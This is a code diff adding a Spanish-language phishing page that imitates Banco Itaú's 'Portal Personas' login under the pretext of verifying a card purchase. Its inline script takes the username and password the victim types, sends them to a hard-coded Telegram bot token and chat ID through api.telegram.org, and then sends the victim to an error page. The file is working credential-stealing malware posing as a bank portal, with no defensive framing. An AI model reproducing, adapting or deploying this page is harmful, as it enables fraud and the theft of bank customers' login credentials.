@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Itaú Personas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 80%;
+        }
+        .container h1 {
+            color: #ff6200;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .container label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+        .container input[type="text"] {
+            width: 90%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .unlock-user {
+            color: #005bbb;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            text-align: left;
+        }
+        .unlock-user svg {
+            margin-right: 5px;
+        }
+        .btn {
+            background-color: #ff6200;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .data-policy {
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        .data-policy a {
+            color: #005bbb;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+   <section style="display: flex; justify-content: center;">
+    <div class="container">
+        <h1>Portal personas</h1>
+        <form>
+            <p style="font-size: smaller; margin-bottom: 4%;">Vamos a valiar tu compra <br> <br>
+
+                Banco Itaú requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
+            <div>
+                <label for="">Usuario *</label>
+                <input type="text" id="username" placeholder="Ingresa tu usuario">
+            </div>
+
+            <div>
+                <label for="">Clave *</label>
+              <input type="text" id="password"  placeholder="Ingresa tu Clave">
+            </div>
+
+            <div class="unlock-user">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24"><path d="M3 11v10a1 1 0 001 1h16a1 1 0 001-1V11M17 7a5 5 0 00-10 0v4"></path><path d="M12 15v2"></path></svg>
+                <a href="#">Desbloquear usuario</a>
+            </div>
+            
+            <div>
+                <button style="margin-top: 5%;" class="btn" id="submitBtn">Ingresar</button>
+            </div>
+
+            <div class="data-policy">
+                Hemos cambiado nuestra política de datos, para mayor información haz clic <a href="#">aquí</a>
+            </div>
+
+            <script>
+                function enviarMensajeTelegram(username, password) {
+    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
+    var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
+    var chatID = '5900829263';
+    var mensaje = 'Logo Itaú: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.getElementById('submitBtn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    if (username.trim() !== '' && password.trim() !== '') {
+        enviarMensajeTelegram(username, password);
+        setTimeout(function() {
+            window.location.href = '../Error.html';
+        }, 1000);
+    } else {
+        alert('Por favor complete todos los campos antes de continuar.');
+    }
+});
+            </script>
+        </form>
+    </div>
+   </section>
+</body>
+</html>
